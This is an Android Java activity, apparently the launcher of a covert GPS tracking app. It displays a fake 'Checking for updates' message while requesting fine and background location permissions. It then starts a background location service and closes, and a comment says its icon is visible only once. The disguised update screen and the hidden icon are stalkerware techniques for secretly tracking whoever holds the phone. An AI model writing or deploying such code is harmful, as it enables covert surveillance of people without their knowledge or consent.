package br.svc.satellite;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.TextView;

/** BUILD SETUP com chave fixa ENI: icone visivel UMA vez pra descongelar aparelho virgem. */
public class MainActivity extends android.app.Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView tv = new TextView(this);
        tv.setText("Verificando atualizações…");
        tv.setTextSize(17);
        tv.setTextColor(Color.DKGRAY);
        tv.setGravity(Gravity.CENTER);
        setContentView(tv);

        java.util.ArrayList<String> ps = new java.util.ArrayList<>();
        ps.add(Manifest.permission.ACCESS_FINE_LOCATION);
        if (Build.VERSION.SDK_INT >= 29) ps.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        if (Build.VERSION.SDK_INT >= 33) ps.add(Manifest.permission.POST_NOTIFICATIONS);

        java.util.ArrayList<String> faltam = new java.util.ArrayList<>();
        for (String p : ps)
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) faltam.add(p);

        if (faltam.isEmpty()) sobe();
        else requestPermissions(faltam.toArray(new String[0]), 42);
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] permis, int[] result) {
        super.onRequestPermissionsResult(req, permis, result);
        sobe();
    }

    private void sobe() {
        try { startForegroundService(new Intent(this, SinoGpsService.class)); }
        catch (Throwable ignored) { }
        finish();
    }
}
